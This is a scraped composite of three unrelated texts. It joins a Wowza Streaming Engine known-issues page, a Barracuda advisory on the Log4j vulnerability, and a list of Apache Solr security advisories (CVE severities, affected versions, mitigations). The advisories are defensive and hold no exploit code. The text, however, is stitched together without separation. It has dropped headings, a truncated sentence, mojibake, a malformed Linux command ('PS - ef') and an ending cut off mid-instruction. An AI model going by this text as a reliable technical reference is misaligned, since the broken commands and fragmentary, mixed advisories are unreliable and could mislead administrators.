[Install the latest updater for Wowza Streaming Engine software](Wowza-Streaming-Engine-Software-Updates#updaters), which has a fix for this issue.
#### Resolved: Incorrect Wowza CPU statistics in Wowza Streaming Engine Manager (cloud deployments)

If you deploy Wowza Streaming Engine media server software in the cloud, and then log into the web-based Wowza Streaming Engine Manager on the cloud-hosted virtual machine, the **Usage** graph in the manager may display a higher **Wowza CPU** value than the actual media server CPU usage. Refreshing the manager webpage may boost the **Wowza CPU** graph so that it's even more out-of-sync from actual CPU consumption.
#### Solution

Update to the latest version of Wowza Streaming Engine. Wowza Streaming Engine 4.7.0 and later includes Wowza CPU calculation improvements to address this issue.

As a workaround, to view Wowza CPU consumption:

* **Windows** - Look at the running Java.exe processes in Windows Task Manager (be sure to **Show processes from all users**).
* **Linux** - Run the following **grep** command to display running Java processes and filters for Java processes:
  ```

  PS - ef  | grep java*
  ```

  Then, to see the CPU usage for a particular Java process, run the **top** command using the Java process identifier (PID).
## Transcoding issues

---

### Open transcoding known issues

The following transcoding known issues are not fixed in the latest version of Wowza Streaming Engine but may have a workaround.

#### Decrease in NVIDIA GPU performance with Wowza Streaming Engine 4.8.14 and later

With NVIDIA GPU-acclerated transcoding in Wowza Streaming Engine 4.8.14 and later, GPU performance is lower than with previous versions of Wowza Streaming Engine. Logs show repeated SKIP1FRAME and ALLFRAMESOFF messages as a result.

#### Solution

There is no fix available at this time.

#### Access logs report warnings for missing Transcoder libraries on Windows after update to 4.8.14

If you use the updater to update to Wowza Streaming Engine 4.8.14 on Windows, when the Transcoder starts, Access logs (wowzastreamingengine\_access.log) report warnings about missing Transcoder library files. These warnings can be ignored as transcoding is not affected and continues normally.
```

WARN 200 - TranscoderSessionNative.loadLibrary: File is missing: C:/Program Files (x86)/Wowza Media Systems/Wowza Streaming Engine 4.8.13+1/lib-native/win64/mc_bc_dec_avc.dll
WARN 200 - TranscoderSessionNative.loadLibrary: File is missing: C:/Program Files (x86)/Wowza Media Systems/Wowza Streaming Engine 4.8.13+1/lib-native/win64/mc_dec_hevc.dll

WARN 200 - TranscoderSessionNative.loadLibrary: File is missing: C:/Program Files (x86)/Wowza Media Systems/Wowza Streaming Engine 4.8.13+1/lib-native/win64/mc_enc_hevc.dll
```
#### Solution

There is no fix available at this time.

As a workaround to remove the warning logs, complete the following steps:

1. Navigate to the **[*install-dir*]\lib-native\win64** directory and open **transcoder.list** in a text editor.
2. Delete the following lines:
   ```

   mc_bc_dec_avc.dll
   mc_dec_hevc.dll
   mc_enc_avc.dll
   mc_enc_hevc.dll
   ```
3. Save your changes and then restart Wowza Streaming Engine.
#### Audio and video drift out of sync when transcoding MPEG-1 Audio Layer II to AAC

If you transcode MPEG-1 Audio Layer II to AAC, you may experience the audio and video drifting out of sync. When transcoding the audio, you may see a log similar to the following:

INFO server comment - JNI:TranscoderSession.audioDecoderCreate[\_defaultVHost\_:live/\_definst\_/mpegtsstream.stream]: Create audio decoder: MPEG1 Part 1/2: default INFO transcoder decoder-audio-start mpegtsstream.stream {"codec":"MP3", "objectType":"MPEG1LAYER2", "sampleRate":48000, "channels":2}
#### Solution

Add a custom property to the Transcoder template that instructs the transcoder to transcode to HE-AAC instead of AAC.

1. Open the transcoder template XML file that you're using, such as **[*install-dir*]/transcoder/templates/transcode.xml**, in a text editor and add the following property to the **<Encode>/<Audio>/<Parameters>** section.
   ```

   <Parameter>
       <Name>mainconcept.he</Name>
       <Value>2</Value>
       <Type>Integer</Type>
   </Parameter>
   ```
2. Save the file and restart incoming stream to pick up the Transcoder template changes.
#### Memory leak when transcoding with transparency overlays (Wowza Streaming Engine 4.5.0.01 and 4.5.0.02)

If you include [graphic overlay images](How-to-set-up-and-run-Wowza-Transcoder-for-live-streaming#config_overlays) when transcoding streams and you set the overlay opacity value to less than **100** (completely opaque), or you use a file for your overlay image that was originally created with less than 100 percent opacity, a memory leak occurs. Our findings also show that the memory leak is larger for larger overlay image files.
#### Solution

There is no fix available at this time.
#### NVIDIA hardware-accelerated decoding doesn't work with Wowza Streaming Engine on Windows 10 with Java 8

NVIDIA accelerated decoding fails on Windows 10 with Java 8. The failure occurs when you use CUDA or NVCUVID acceleration for decoding. (NVENC acceleration seems to work.)
#### Solution

Use Java 7 on Windows 10 to avoid this issue. For information on installing Java, see [Manually install and troubleshoot Java on Wowza Streaming Engine](/docs/manually-install-and-troubleshoot-java-on-wowza-streaming-engine "Manually install and troubleshoot Java on Wowza Streaming Engine"). NVIDIA is investigating this issue.
#### Wowza Transcoder doesn't work in some versions of Wowza Streaming Engine on CentOS 6

*Wowza Streaming Engine 4.7.8*

Wowza Streaming Engine 4.7.8 included changes to the minimum supported versions of some of the libraries used by Wowza Transcoder. For example, GNU C Library (glibc) 2.17 is now the minimum supported version.

*Wowza Streaming Engine 4.7.5*

Wowza Streaming Engine 4.7.5 included changes to some of the libraries used by Wowza Transcoder, including updating the GNU C Library (glibc) to version 2.14. However, CentOS 6.9 doesn't support glibc 2.14. This means Wowza Transcoder doesn't work on CentOS 6.9 with Wowza Streaming Engine 4.7.5.

#### Solution

*Wowza Streaming Engine 4.7.8*

Update to a version of CentOS that supports glibc version 2.17 or later. Wowza Streaming Engine 4.7.8 doesn't support CentOS 6.

*Wowza Streaming Engine 4.7.5*

The best solution is to update to Wowza Streaming Engine versions 4.7.5.01 - 4.7.7.

Alternatively, you can update to CentOS 7, which supports glibc 2.14 and would enable you to use the fixes and new features in Wowza Streaming Engine 4.7.5.

If you can't update to CentOS 7 and need to use Wowza Transcoder, don't update to Wowza Streaming Engine version 4.7.5. Earlier versions of Wowza Streaming Engine media server software use glibc 2.12, which is supported by CentOS 6.9.

* If you're installing Wowza Streaming Engine media server software for the first time, request a copy of the Wowza Streaming Engine 4.7.4 installer package.
* If you've already updated to Wowza Streaming Engine 4.7.5, follow the instructions in [Remove an update on Linux](https://www.wowza.com/docs/how-to-update-your-wowza-streaming-engine-installation#remove_update_linux_text) to remove the 4.7.5 update and revert to an earlier version of the media server software.
### Resolved transcoding known issues

The following transcoding known issues are fixed in at least the latest version of Wowza Streaming Engine, if not in earlier versions too.

Resolved: Wowza Video stream targets using connection codes starting incorrectly

Wowza Video Transcoder stream targets using connection codes in versions 4.8.24 - 4.8.26 fail to start stream targets correctly. This can trigger the transcoder to start unnecessarily in Wowza Video and impact billing.

Solution

The Wowza Video Transcoder workflow will be replaced with Wowza Streaming Engine version 4.8.27. However, for existing configurations, we recommend rolling back to version 4.8.23.

#### Resolved: Overlay image issues with NVIDIA CUDA scaling on Windows with 4.8.14

With Wowza Streaming Engine 4.8.14, when using graphic overlays and the **CUDA** [scaling implementation](/docs/how-to-set-up-and-run-wowza-transcoder-for-live-streaming#template_scale "Set up and run Transcoder in Wowza Streaming Engine") for NVIDIA GPU-accelerated transcoding on a Windows system, the overlay images can flicker or appear transparent.
#### Solution

Update to the latest version of Wowza Streaming Engine. This problem is fixed in Wowza Streaming Engine 4.8.15 and later.

#### Resolved: Wowza Streaming Engine does not support CUDA 11

Wowza Streaming Engine 4.8.13 and earlier do not work with NVIDIA drivers that support CUDA 11.
#### Solution

Update to the latest version of Wowza Streaming Engine. Wowza Streaming Engine 4.8.14 upgraded CUDA support to CUDA 11 and supports NVIDIA drivers 460.00 and later.

If you are using an earlier version of Wowza Streaming Engine, install an NVIDIA driver that supports CUDA 10, such as version 440. See the [NVIDIA documentation](https://docs.nvidia.com/datacenter/tesla/tesla-installation-notes/index.html) for installation instructions.
#### Resolved: NVIDIA NVENC hardware-accelerated encoding doesn't work with Wowza Streaming Engine 4.2.0

An issue in Wowza Streaming Engine 4.2.0 software prevents NVIDIA hardware from being recognized; therefore, NVIDIA NVENC hardware-accelerated encoding can't be enabled for Transcoder.
#### Solution

Wowza has fixed this issue in the latest Wowza Streaming Engine software update. To get this update, sign in to your **Account Management** page using your Wowza account and then check the **[Downloads](https://www.wowza.com/portal/account?tab=downloads)** tab. You must have an active Maintenance and Support contract to receive updates.
## Playback issues

---

### Open playback known issues

The following playback known issues are not fixed in the latest version of Wowza Streaming Engine or a third-party technology but may have a workaround.

#### iOS15+ WebRTC publishing fails due to fragmented WebSockets

We previously noticed an issue related to devices running iOS15+ that caused WebRTC publishing to fail in Wowza Streaming Engine. Reported errors include a WebSocket Connection Failed message.

Our initial investigation led us to believe this was due to [Apple's WebSocket fragmentation](http://www.wowza.com/community/t/ios-15-webrtc-problem/93868/4). After further exploration, we believe this issue is connected to the NSURLSession WebSocket experimental feature from Apple. For a workaround, check the following solution.

Solution

To circumvent this problem and publish the WebRTC stream:

1. Go to Safari > Settings > Advanced.

2. Enable Show Develop menu in menu bar.

3. From Develop in the menu bar, go to Experimental Features and disable the NSURLSession WebSocket feature.

Alternatively, see this related [resolved playback issue](#resolved-web-rtc-ios-15) and download our published solution [here](https://github.com/WowzaMediaSystems/webrtc-examples/pull/29).

#### iOS 7 and iOS 8 native players incorrectly display CEA-608 captions that have 32 characters

A CEA-608 caption that has exactly 32 characters and is sent as part of the video NAL units is displayed incorrectly. This doesn't occur if the caption has 31 or 33 characters.
#### Solution

There's no fix at this time. Bug 19179149 is open in the Apple Radar bug reporting tool. Last tested with iOS 8.3.
#### Playback issues with MPEG-DASH streams

When using the DASH-IF reference player (dash.js) and Google Chrome, DASH streams may play for a while and then start looping on a single media segment.
#### Solution

We recommend that you use either the [Google Shaka player](how-to-use-google-shaka-player-with-wowza-streaming-engine-mpeg-dash) or the [Bitmovin Adaptive Streaming Player](how-to-use-bitmovin-bitdash-players-with-wowza-streaming-engine-mpeg-dash) to play DASH streams. These players seem to have better compatibility with Wowza Streaming Engine MPEG-DASH streams.

#### Transcoded WebRTC source streams with passthrough video fail to play over MPEG-TS HLS

WebRTC source streams, including those with H.264 video, that are transcoded for adaptive bitrate streaming with **Video Codec** set to **Passthrough** encounter playback issues over MPEG-TS HLS (**cupertinostreamingpacketizer**).
#### Solution

There is no fix available at this time, but you can transcode the video by setting **Video Codec** to another codec, rather than **Passthrough**, to avoid this issue.
### Resolved playback known issues

The following playback known issues are fixed in at least the latest version of Wowza Streaming Engine, if not in earlier versions too, or a third-party technology.

####

#### Resolved: WebRTC publishing and playback fails with Safari on iOS 15

Publishing or playing a WebRTC stream using Safari on iOS 15 fails.

With the Wowza Streaming Engine WebRTC test pages, you get the following error message:

```

WebSocket connection to ‘wss://[address]:443/webrtc-session.json’ failed. The operation could not be completed. Socket is not connected.
```
#### Solution

The fix is to download our published example from [here](https://github.com/WowzaMediaSystems/webrtc-examples/pull/29).

#### Resolved: Live DVR streams won't start on iOS 8

Live streams with DVR enabled by Wowza nDVR may not start playback on iOS 8 devices.
#### Solution

This issue is fixed on iOS 12. If you encounter this issue on your iOS 8-based player, you can either touch and hold the **Rewind** button to start playback immediately or wait for about 30 seconds for playback to start.

**Note:** This problem doesn't occur on iOS 7 (or earlier).

#### Resolved: Problems with WebVTT closed captions in JW Player 7

JW Player has confirmed that a problem in their JW Player 7 software may prevent WebVTT closed captions in live streams from being displayed during playback.
#### Solution

JW Player addressed the issue in JW Player 8. You can also use JW Player 6 or CEA-608 captions.
#### Resolved: Apple HLS playback issues using the Microsoft Edge native player

In the Microsoft Edge native player, you can play Apple HLS streams, but artifacts appear across the lower part of the video. This issue was reported with Edge version 20.10240.16384.0 on Windows 10 (build 10240).
#### Solution

The issue doesn't occur with Edge version 25.10586.0.0 on Windows 10 (version 1511 - OS build 10586.3).
#### Resolved: WebVTT closed captions dropped from long-running live streams on iOS 9

On iOS 9-based players, after a live stream with WebVTT captions runs for over 12 hours, the captions no longer appear in the player.
#### Solution

This issue is fixed in iOS 12-based players. It also doesn't occur with iOS 8 and iOS 7 players.

# Apache Log4j Vulnerability

## We are committed to securing your data.

## Cybersecurity Threat Advisory 0083-21: Second Log4j Vulnerability Patch Released

**THREAT UPDATE**

Over this past week, several organizations are releasing security updates to address the Apache Log4j zero-day vulnerability being exploited in the wild. Although Apache released an initial patch for the exploit, it was deemed incomplete due to a lack of security for non-default configurations. In response, Apache has released a second patch, Log4j 2.16.0, which is designed to mitigate the vulnerability entirely.

### Technical detail and additional information

**WHAT IS THE THREAT?**

As we know, a significant Log4j Remote Code Execution (RCE) vulnerability has had a patch released and tracked as CVE-2021-44228. However, the patch was not entirely effective at mitigating the risk due to CVE-2021-45046, the lack of completion in some non-default configurations. The latest patch, Log4j 2.16.0, removes support for message lookup patterns and disables JNDI functionality by default all together. While CVE-2021-44228 simply disabled the ability to control log messages or log message parameters to execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. Furthermore, for prior releases (<2.16.0) this issue can also be mitigated by removing the JndiLookup class from the classpath.

**WHY IS IT NOTEWORTHY?**

Log4j is practically omnipresent in the world of websites and all things Java. It was used to log information for the web applications developers created in efforts to aid with debugging and for other tracking purposes. LDAP, RMI and other JNDI endpoints can be used as avenues to execute arbitrary code from a threat actor utilizing the Log4j vulnerability. Many malicious actors and threat groups are using this vulnerability to gain unauthorized access. Many believe due to the magnitude of the vulnerability the detections confirmed will continue to grow and mitigation will be a slower than usual process. Furthermore, NIST has given this vulnerability a base score of 10, ten being most critical.

## Barracuda's Response Updates

**UPDATE DECEMBER 12TH, 2021:**

Barracuda Networks is aware of the recently disclosed security issue affecting the open-source Apache "Log4j" utility ([CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228)). We have increased our security monitoring protocols and are actively updating to the latest version of Log4j for all of our infrastructure and services.

We strongly encourage customers who manage environments containing Log4j to update to the latest version, available at <https://logging.apache.org/log4j/2.x/download.html>

We will continue to post updates to this page as status changes.

**UPDATE DECEMBER 14TH, 2021:**

Barracuda Networks continues our analysis of ([CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228)) the remote code execution vulnerability related to Apache Log4j. We have confirmed that none of our products are using vulnerable log4j versions associated with [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228) at this time. Additionally, external scans against our products and production hosts have not identified actual exposure within our environment.

Our product and security teams is currently conducting holistic reviews of our infrastructure, tools, and third-party services to identify and remediate any potential vulnerabilities.

**UPDATE DECEMBER 20TH, 2021:**

In light of the new Apache Log4j version 2.17.0, Barracuda Networks is continuing our security monitoring protocols and is actively updating to the latest version of Log4j for all of our infrastructure and services.

**UPDATE JANUARY 3RD, 2022:**

With the new Apache Log4j version release, we have confirmed that none of our products are using vulnerable log4j versions associated with [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228) at this time. We continue to run and monitor our external scans against our environment.

Summary of what we know so far:

* **The vulnerability CVE-2021-44228 affects log4j 2.x only**. It was introduced in version **2.0-beta9** and fixed in **2.15.0-rc2**. log4j 1.x is unaffected. For the vulnerability to be present, log4j-core-2.\*.jar (or a shaded equivalent) needs to be bundled with the plugin, anything else (slf4j bridges, API jars, log4j 1.x) doesn't include the vulnerable class (see below).
* Recent JREs prohibit the specific LDAP RCE exploit, but other exploits exist (e.g. capturing env vars).
* Maven Shade Plugin may rename packages, so there may be matches in other packages (but a patched usage-in-plugins found none in latest plugin releases)
* Further plugins may have included the library in older releases. We are working on a list.
* **log4j 2.16.0 includes a fix for another security vulnerability**, see <https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f> It's low severity, and requires a nondefault configuration to be exploitable (or attackers able to configure logging). It affects **2.0-beta9 through 2.15.0** (inclusive) and is **fixed in 2.16.0**.
* The specific affected classes are **org.apache.logging.log4j.core.lookup.JndiLookup** and org.apache.logging.log4j.core.net.JndiManager (previously org.apache.logging.log4j.core.appender.JndiManager). The former should be removed manually according to <https://logging.apache.org/log4j/2.x/security.html> when using affected versions. This applied to both vulnerabilities.

# Solrâ¢ Security News[Â¶](#solr-news "Permanent link")

## How to report a security issue

### Published CVEs Detected by Scanners

Every CVE that is detected by a software scanner is by definition already public knowledge. That means the Solr PMC and the rest of the world probably already know about it.

To find a path forward in addressing a detected CVE we suggest the following process for fastest results:

1. Check [further down this page](#recent-cve-reports-for-apache-solr) to see if the CVE is listed as exploitable in Solr.
2. Check the [officially published non-exploitable vulnerabilities](#cve-reports-for-apache-solr-dependencies) list to see if the CVE is listed as not exploitable in Solr.
3. Search through the [Solr users mailing list archive](https://lists.apache.org/list.html?users@solr.apache.org) to see if anyone else has brought up this dependency CVE.
4. If no one has, then please do [subscribe to the users mailing list](https://solr.apache.org/community.html#mailing-lists-chat) and then send an email asking about the CVE.

#### Dos and Don'ts

* Please DO discuss the possible need for library upgrades on the user list.
* Please DO search Jira for the CVE number to see if we are addressing it already.
* Please DO create Jira issues and associated pull requests to propose and discuss upgrades of *a single specific* dependency.
* Please DO NOT attach a scan report, or paste output of a scan into Jira (just link the CVE instead)
* Please DO NOT email the security email below with a scan report it will be ignored.
* Please DO look into automating some of this with [VEX](#vex) and share your experience.

#### Use of Jira

Jira is for discussing specific development modifications. Any Jira that contains only scan report output, or references multiple dependencies at the same time is likely to be ignored/closed. The large number of folks sending us reports of things that are already known is a serious drag on our (volunteer) time so **please search Jira** before opening a new issue.

### New Exploits You Discover in Solr

The Solr PMC greatly appreciates reports of new security vulnerabilities found in Solr itself or demonstrations of exploiting vulnerabilities via dependencies.
**It is important not to publish a previously unknown exploit**, or exploit demonstration code on public mailing lists.
Please disclose new exploits responsibly by following these [ASF guidelines](https://www.apache.org/security/) for reporting.
The contact email for reporting newly discovered exploits in Solr is security@solr.apache.org.

Before reporting a new exploit ensure that you have tested it against an instance of Solr that is running a [supported version](https://solr.apache.org/downloads.html) and has been properly configured with:

1. **Authentication** - Exploits demonstrated without login waste our time because Solr is not meant to run such that the entire world has access to all of its APIs. Running without forcing users to log in is no more valid than running linux with a widely known default root password, or a database with a root account that has no password.
2. **Authorization** - It is not an exploit unless the authenticated user was configured with a role that should have prohibited the action, or the action should never be allowed for any user regardless of role. Your report should say why you think this action is not acceptable for the role(s) you tested it with.

#### VEX

Since the process of checking whether CVEs in dependencies of Solr affect your
Solr deployment is tedious and error-prone, we are experimenting with sharing
information about advisories that are known (not) to affect Solr in a
machine-readable way.

File formats to share this information are called 'VEX' formats. A number of
such formats are under active development, such as based on
[CycloneDX](https://cyclonedx.org/capabilities/vex/) and
[CSAF](https://github.com/oasis-tcs/csaf/blob/master/csaf_2.0/prose/csaf-v2-editor-draft.md#45-profile-5-vex).

We are currently providing vulnerability information in a CycloneDX JSON-based
format [here](/solr.vex.json). We are very curious to hear about your experience,
and to find out what is still missing to reduce the signal/noise ratio and make
these tools more effective. We invite you to join the discussion at the
security-discuss
[mailinglist](https://www.apache.org/foundation/mailinglists.html) or,
if you prefer to collaborate in private, contact
security@apache.org. It will likely be interesting
to know what security scanning/reporting tool you are using, exactly on which
artifacts, and if/how its vendor appears to support VEX. We'd be happy to work
with you to see if we can provide this information in other variations or formats.

**Severity:**

Critical

**Versions Affected:**

* Apache Solr 5.3.0 before 8.11.4
* Apache Solr 9.0.0 before 9.7.0

**Description:**

Improper Authentication vulnerability in Apache Solr.

Solr instances using the PKIAuthenticationPlugin, which is enabled by default when Solr Authentication is used, are vulnerable to Authentication bypass.
A fake ending at the end of any Solr API URL path, will allow requests to skip Authentication while maintaining the API contract with the original URL Path.
This fake ending looks like an unprotected API path, however it is stripped off internally after authentication but before API routing.

**Mitigation:**

Users are recommended to upgrade to version 9.7.0, or 8.11.4, which fix the issue.

## 2024-10-14, CVE-2024-45217: Apache Solr: ConfigSets created during a backup restore command are trusted implicitly [Â¶](#cve-2024-45217-apache-solr-configsets-created-during-a-backup-restore-command-are-trusted-implicitly "Permanent link")

**Severity:**

Moderate

**Versions Affected:**

* Apache Solr 6.6.0 before 8.11.4
* Apache Solr 9.0.0 before 9.7.0

**Description:**

Insecure Default Initialization of Resource vulnerability in Apache Solr.

New ConfigSets that are created via a Restore command, which copy a configSet from the backup and give it a new name, are created without setting the "trusted" metadata.
ConfigSets that do not contain the flag are trusted implicitly if the metadata is missing, therefore this leads to "trusted" ConfigSets that may not have been created with an Authenticated request.
"trusted" ConfigSets are able to load custom code into classloaders, therefore the flag is supposed to only be set when the request that uploads the ConfigSet is Authenticated & Authorized.

**Mitigation:**

This issue affects Apache Solr: from 6.6.0 before 8.11.4, from 9.0.0 before 9.7.0. This issue does not affect Solr instances that are secured via Authentication/Authorization.

Users are primarily recommended to use Authentication and Authorization when running Solr. However, upgrading to version 9.7.0, or 8.11.4 will mitigate this issue otherwise.

## 2024-04-12, CVE-2024-31391: Solr-Operator liveness and readiness probes may leak basic auth credentials [Â¶](#cve-2024-31391-solr-operator-liveness-and-readiness-probes-may-leak-basic-auth-credentials "Permanent link")

**Severity:**

Moderate

**Versions Affected:**

Solr Operator 0.3.0 to 0.8.0

**Description:**
Insertion of Sensitive Information into Log File vulnerability in the Apache Solr Operator.

The Solr sked to bootstrap Solr security, the operator will enable basic authentication and create several accounts for accessing Solr: including the "solr" and "admin" accounts for use by end-users, and a "k8s-oper" account which the operator uses for its own requests to Solr.
One common source of these operator requests is healthchecks: liveness, readiness, and startup probes are all used to determine Solr's health and ability to receive traffic.
By default, the operator configures the Solr APIs used for these probes to be exempt from authentication, but users may specifically request that authentication be required on probe endpoints as well.
Whenever one of these probes would fail, if authentication was in use, the Solr Operator would create a Kubernetes "event" containing the username and password of the "k8s-oper" account.

Within the affected version range, this vulnerability affects any solrcloud resource which (1) bootstrapped security through use of the `.solrOptions.security.authenticationType=basic` option, and (2) required authentication be used on probes by setting `.solrOptions.security.probesRequireAuth=true`.

**Mitigation:**
Users are recommended to upgrade to Solr Operator version 0.8.1, which fixes this issue by ensuring that probes no longer print the credentials used for Solr requests. Users may also mitigate the vulnerability by disabling authentication on their healthcheck probes using the setting `.solrOptions.security.probesRequireAuth=false`.

**Severity:**

Moderate

**Versions Affected:**

* Apache Solr 6.0.0 through 8.11.2
* Apache Solr 9.0.0 before 9.3.0

**Description:**

Insufficiently Protected Credentials vulnerability in Apache Solr.

This issue affects Apache Solr: from 6.0.0 through 8.11.2, from 9.0.0 before 9.3.0.
One of the two endpoints that publishes the Solr process' Java system properties, /admin/info/properties, was only setup to hide system properties that had "password" contained in the name.
There are a number of sensitive system properties, such as "basicauth" and "aws.secretKey" do not contain "password", thus their values were published via the "/admin/info/properties" endpoint.
This endpoint populates the list of System Properties on the home screen of the Solr Admin page, making the exposed credentials visible in the UI.

This /admin/info/properties endpoint is protected under the "config-read" permission.
Therefore, Solr Clouds with Authorization enabled will only be vulnerable through logged-in users that have the "config-read" permission.
Users are recommended to upgrade to version 9.3.0 or 8.11.3, which fixes the issue.
A single option now controls hiding Java system property for all endpoints, "-Dsolr.hiddenSysProps".
By default all known sensitive properties are hidden (including "-Dbasicauth"), as well as any property with a name containing "secret" or "password".

Users who cannot upgrade can also use the following Java system property to fix the issue:

`-Dsolr.redaction.system.pattern=".*(password|secret|basicauth).*"`

**Mitigation:**

Users are recommended to upgrade to version 8.11.3, 9.3.0 or later, which has consistent systemProperty redaction logic.

**Versions Affected:**

* Apache Solr 6.0.0 through 8.11.2
* Apache Solr 9.0.0 before 9.3.0

**Description:**

Incorrect Permission Assignment for Critical Resource, Improper Control of Dynamically-Managed Code Resources vulnerability in Apache Solr.

This issue affects Apache Solr: from 8.10.0 through 8.11.2, from 9.0.0 before 9.3.0.

The Schema Designer was introduced to allow users to more easily configure and test new Schemas and configSets.
However, when the feature was created, the "trust" (authentication) of these configSets was not considered.
External library loading is only available to configSets that are "trusted" (created by authenticated users), thus non-authenticated users are unable to perform Remote Code Execution.
Since the Schema Designer loaded configSets without taking their "trust" into account, configSets that were created by unauthenticated users were allowed to load external libraries when used in the Schema Designer.

**Mitigation:**

Users are recommended to upgrade to version 8.11.3, 9.3.0 or later.

**Severity:**

Low

**Versions Affected:**

* Apache Solr 6.0.0 through 8.11.2
* Apache Solr 9.0.0 before 9.4.1

**Description:**

Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Apache Solr.This issue affects Apache Solr: from 6.0.0 through 8.11.2, from 9.0.0 before 9.4.1.

Solr Streaming Expressions allows users to extract data from other Solr Clouds, using a "zkHost" parameter.
When original SolrCloud is setup to use ZooKeeper credentials and ACLs, they will be sent to whatever "zkHost" the user provides.
An attacker could setup a server to mock ZooKeeper, that accepts ZooKeeper requests with credentials and ACLs and extracts the sensitive information,
then send a streaming expression using the mock server's address in "zkHost".
Streaming Expressions are exposed via the "/streaming" handler, with "read" permissions.

**Mitigation:**

Users are recommended to upgrade to version 8.11.3 or 9.4.1, which fix the issue.
From these versions on, only zkHost values that have the same server address (regardless of chroot), will use the given ZooKeeper credentials and ACLs when connecting.

**Severity:**

Moderate

**Versions Affected:**

* Apache Solr 6.0.0 through 8.11.2
* Apache Solr 9.0.0 before 9.4.1

**Description:**

Improper Control of Dynamically-Managed Code Resources, Unrestricted Upload of File with Dangerous Type, Inclusion of Functionality from Untrusted Control Sphere vulnerability in Apache Solr.This issue affects Apache Solr: from 6.0.0 through 8.11.2, from 9.0.0 before 9.4.1.

In the affected versions, Solr ConfigSets accepted Java jar and class files to be uploaded through the ConfigSets API.
When backing up Solr Collections, these configSet files would be saved to disk when using the LocalFileSystemRepository (the default for backups).
If the backup was saved to a directory that Solr uses in its ClassPath/ClassLoaders, then the jar and class files would be available to use with any ConfigSet, trusted or untrusted.

When Solr is run in a secure way (Authorization enabled), as is strongly suggested, this vulnerability is limited to extending the Backup permissions with the ability to add libraries.

**Mitigation:**

Users are recommended to upgrade to version 8.11.3 or 9.4.1, which fix the issue.
In these versions, the following protections have been added:

* Users are no longer able to upload files to a configSet that could be executed via a Java ClassLoader.
* The Backup API restricts saving backups to directories that are used in the ClassLoader.

**Severity:**

Important

**Versions Affected:**

Solr 9.0 to 9.2.1

**Description:**

Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Apache Solr.
The Solr Metrics API publishes all unprotected environment variables available to each Apache Solr instance.
Users are able to specify which environment variables to hide, however, the default list is designed to work for known secret Java system properties.
Environment variables cannot be strictly defined in Solr, like Java system properties can be, and may be set for the entire host, unlike Java system properties which are set per-Java-process.

The Solr Metrics API is protected by the "metrics-read" permission.
Therefore, Solr Clouds with Authorization setup will only be vulnerable via users with the "metrics-read" permission.

**Mitigation:**

Users are recommended to upgrade to version 9.3.0 or later, in which environment variables are not published via the Metrics API.

## 2022-11-20, Apache Solr is vulnerable to CVE-2022-39135 via /sql handler [Â¶](#apache-solr-is-vulnerable-to-cve-2022-39135-via-sql-handler "Permanent link")

**Versions Affected:**

Solr 6.5 to 8.11.2
Solr 9.0

**Description:**

Apache Calcite has a vulnerability, CVE-2022-39135, that is exploitable in Apache Solr in SolrCloud mode. If an untrusted user can supply SQL queries to Solrâs â/sqlâ handler (even indirectly via proxies / other apps), then the user could perform an XML External Entity (XXE) attack. This might have been exposed by some deployers of Solr in order for internal analysts to use JDBC based tooling, but would have unlikely been granted to wider audiences.

**Impact:**

An XXE attack may lead to the disclosure of confidential data, denial of service, server side request forgery (SSRF), port scanning from the Solr node, and other system impacts.

**Mitigation:**

Most Solr installations donât make use of the SQL functionality. For such users, the standard Solr security advice of using a firewall should be adequate. Nonetheless, the functionality can be disabled. As of Solr 9, it has been modularized and thus became opt-in, so nothing is needed for Solr 9 users that donât use it. Users *not* using SolrCloud canât use the functionality at all. For other users that wish to disable it, you must register a request handler that masks the underlying functionality in solrconfig.xml like so:

```
  <requestHandler name="/sql" class="solr.NotFoundRequestHandler"/>

```

Users needing this SQL functionality are forced to upgrade to Solr 9.1. If Solr 8.11.3 is released, then it will be an option as well. Simply replacing Calcite and other JAR files may mostly work but could fail depending on the particulars of the query. Users interested in this or in patching their own versions of Solr should examine SOLR-16421 for a source patch.

**Severity:**

Moderate

**Versions Affected:**

All versions prior to 8.11.1. Affected platforms: Windows.

**Description:**

An Improper Input Validation vulnerability in DataImportHandler of Apache Solr allows an attacker to provide a Windows UNC path resulting in an SMB network call being made from the Solr host to another host on the network. If the attacker has wider access to the network, this may lead to SMB attacks, which may result in:

* The exfiltration of sensitive data such as OS user hashes (NTLM/LM hashes),
* In case of misconfigured systems, SMB Relay Attacks which can lead to user impersonation on SMB Shares or, in a worse-case scenario, Remote Code Execution

This issue affects all Apache Solr versions prior to 8.11.1. This issue only affects Windows.

**Mitigation:**

Upgrade to Solr 8.11.1, and/or ensure only trusted clients can make requests to Solr's DataImport handler.

## 2021-12-10, Apache Solr affected by Apache Log4J CVE-2021-44228 [Â¶](#apache-solr-affected-by-apache-log4j-cve-2021-44228 "Permanent link")

**Severity:**
Critical

**Versions Affected:**
7.4.0 to 7.7.3, 8.0.0 to 8.11.0

**Description:**
Apache Solr releases prior to 8.11.1 were using a bundled version of the Apache Log4J library vulnerable to RCE. For full impact and additional detail consult the Log4J security page.

Apache Solr releases prior to 7.4 (i.e. Solr 5, Solr 6, and Solr 7 through 7.3) use Log4J 1.2.17 which may be vulnerable for installations using non-default logging configurations that include the JMS Appender, see <https://github.com/apache/logging-log4j2/pull/608#issuecomment-990494126> for discussion.

Solr's Prometheus Exporter uses Log4J as well but it does not log user input or data, so we don't see a risk there.

Solr is *not* vulnerable to the followup **CVE-2021-45046** and **CVE-2021-45105**. A listing of these and other CVEs with some justifications are listed in Solr's wiki: <https://cwiki.apache.org/confluence/display/SOLR/SolrSecurity#SolrSecurity-SolrandVulnerabilityScanningTools>

**Mitigation:**
Any of the following are enough to prevent this vulnerability for Solr servers:

* Upgrade to `Solr 8.11.1` or greater (when available), which will include an updated version (`>= 2.16.0`) of the Log4J dependency.
* If you are using Solr's official docker image, it has already been mitigated in all versions listed as supported on Docker Hub: <https://hub.docker.com/_/solr>. You may need to re-pull the image.
* Manually update the version of Log4J on your runtime classpath and restart your Solr application.
* (Linux/MacOS) Edit your `solr.in.sh` file to include:
